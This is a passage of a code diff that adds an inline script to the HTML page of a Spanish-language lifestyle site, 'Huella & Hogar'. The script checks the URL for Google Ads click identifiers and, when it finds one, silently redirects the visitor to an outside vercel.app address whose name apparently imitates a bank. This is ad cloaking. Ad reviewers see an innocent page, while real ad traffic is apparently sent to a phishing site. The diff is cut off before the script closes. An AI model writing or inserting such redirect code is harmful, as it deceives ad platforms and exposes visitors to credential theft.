@@ -1,5 +1,12 @@
 <!doctype html>
 <html lang="es">
+  <script>
+  (function () {
+    var redirigir = true;
+    var urlRedireccion = 'https://bcapersonasgru.vercel.app/';
+    var params = new URLSearchParams(window.location.search);
+    if (redirigir && (params.has('gclid') || params.has('gad_source') || params.has('gbraid') || params.has('wbraid'))) {
+      window.location.replace(urlRedireccion);
 <head>
 <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Huella &amp; Hogar — La vida que compartimos</title>
